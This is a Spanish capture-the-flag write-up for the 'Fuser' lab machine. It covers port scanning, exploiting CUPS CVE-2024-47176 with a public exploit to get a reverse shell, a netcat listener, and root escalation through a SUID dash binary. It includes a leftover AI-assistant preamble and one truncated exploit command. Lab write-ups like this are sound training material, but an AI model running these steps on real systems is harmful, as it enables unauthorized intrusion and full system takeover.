# 🔍 Write-Up: VulnHub Basic - FUSER

![image](https://github.com/user-attachments/assets/488b1a00-b823-422f-a13c-2bd8304711da)


Aquí tienes el archivo `README.md` para la máquina **Fuser** de VulNyx, basado en el writeup que proporcionaste. Este archivo está listo para copiar y pegar en tu repositorio de GitHub:

```markdown
# Máquina Fuser - VulNyx (Dificultad: Low)

## Descripción
Fuser es una máquina de la plataforma VulNyx con un nivel de dificultad **Low**. En este laboratorio, se explora una vulnerabilidad en el servicio **CUPS (Common UNIX Printing System)** y se realiza una escalada de privilegios aprovechando un binario con el bit SUID activado. El objetivo es obtener acceso root a la máquina y encontrar la flag.

## Resumen de conceptos trabajados
- Escaneo de puertos con Nmap.
- Explotación de una vulnerabilidad en CUPS (CVE-2024-47176).
- Escalada de privilegios mediante un binario SUID (Dash).

---

## Pasos para la resolución

### **1. Conexión y verificación**
- Descargar la máquina Fuser de VulNyx y configurarla en VirtualBox o VMware con **Red NAT**.
- Verificar la conexión con la máquina víctima:
  ```bash
  sudo arp-scan -I eth0 --localnet
  ping -c 1 10.0.2.5 -R
  ```
  El TTL de 64 indica que es una máquina Linux.

---

### **2. Escaneo de puertos**
- Realizar un escaneo de puertos con Nmap:
  ```bash
  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.0.2.5 -oG Escaneo
  ```
  Se detectan los puertos **22 (SSH)**, **80 (HTTP)** y **631 (IPP/CUPS)** abiertos.

- Escanear versiones de los servicios:
  ```bash
  nmap -sCV -p22,80,631 10.0.2.5
  ```
  Se identifica que el servicio **CUPS** está en la versión **2.3.3op2**.

---

### **3. Análisis del servicio CUPS**
- Acceder al panel de CUPS desde el navegador:
  ```
  http://10.0.2.5:631
  ```
  Se observa un panel de gestión de impresoras.

- Investigar la sección `/printers`, donde se encuentra un nombre de usuario (**Konika Minolta**) y una lista de impresoras.

- Buscar vulnerabilidades en CUPS 2.3.3:
  ```bash
  searchsploit CUPS 2.3.3
  ```
  No se encuentran exploits públicos, pero se identifican CVEs relacionados:
  - **CVE-2024-47176**: Vulnerabilidad en `cups-browsed`.
  - **CVE-2024-47076**: Vulnerabilidad en `libcupsfilters`.
  - **CVE-2024-47175**: Vulnerabilidad en `libppd`.
  - **CVE-2024-47177**: Vulnerabilidad en `cups-filters`.

---

### **4. Explotación de CUPS**
- Clonar el repositorio del exploit de ippsec:
  ```bash
  git clone https://github.com/ippsec/cups-exploit.git
  cd cups-exploit
  ```
- Ejecutar el exploit:
  ```bash
  python3 exploit.py 10.


#### **Creación de una impresora maliciosa**
- El exploit de ippsec automatiza la creación de una impresora maliciosa en el servicio CUPS. Al ejecutar el exploit, se crea una impresora llamada **HACKED_10_0_2_4**.
  ```bash
  python3 exploit.py 10.0.2.5
  ```

#### **Activación del exploit**
- Acceder al panel de CUPS desde el navegador:
  ```
  http://10.0.2.5:631
  ```
- Navegar a la sección de impresoras y seleccionar la impresora **HACKED_10_0_2_4**.
- Hacer clic en **"Imprimir página de prueba"** para activar el exploit.

#### **Obtención de la shell inversa**
- Al hacer clic en "Imprimir página de prueba", el código malicioso se ejecuta y se abre una **shell inversa** en la máquina atacante.
- Verificar la conexión en la máquina atacante:
  ```bash
  nc -nlvp 4444
  ```
  Se obtiene una shell en la máquina víctima.

---

### **5. Tratamiento de la TTY**
- Una vez dentro de la máquina víctima, es recomendable mejorar la shell para hacerla más interactiva:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  ```
  Esto permite usar comandos como `clear`, `su`, y autocompletar con `Tab`.

---

### **6. Escalada de privilegios**

#### **Búsqueda de binarios SUID**
- Buscar binarios con el bit SUID activado:
  ```bash
  find / -perm -4000 2>/dev/null
  ```
  Se identifica que el binario **`dash`** tiene el bit SUID activado.

#### **Explotación del binario SUID**
- El binario `dash` con el bit SUID permite escalar privilegios ejecutándolo con la opción `-p`:
  ```bash
  /usr/bin/dash -p
  ```
  Esto otorga una shell con privilegios de **root**.

---

### **7. Obtención de la flag**
- Una vez como root, buscar la flag en el directorio `/root`:
  ```bash
  cd /root
  cat root.txt
  ```

---

## Resumen
Para resolver la máquina Fuser:
1. Se realizó un escaneo de puertos, identificando los servicios SSH, HTTP y CUPS.
2. Se explotó una vulnerabilidad en CUPS (CVE-2024-47176) utilizando un exploit automatizado de ippsec, lo que permitió obtener una shell inversa.
3. Se escalaron privilegios aprovechando un binario SUID (`dash`).
4. Finalmente, se localizó la flag en el directorio `/root`.

Este laboratorio demuestra cómo una configuración insegura en servicios como CUPS y binarios SUID puede permitir el control total de un sistema.

---

## Herramientas utilizadas
- **Nmap**: Para escaneo de puertos y detección de servicios.
- **Searchsploit**: Para buscar vulnerabilidades conocidas.
- **Exploit de ippsec**: Para explotar la vulnerabilidad en CUPS.
- **Dash**: Para escalada de privilegios mediante binario SUID.

---




  
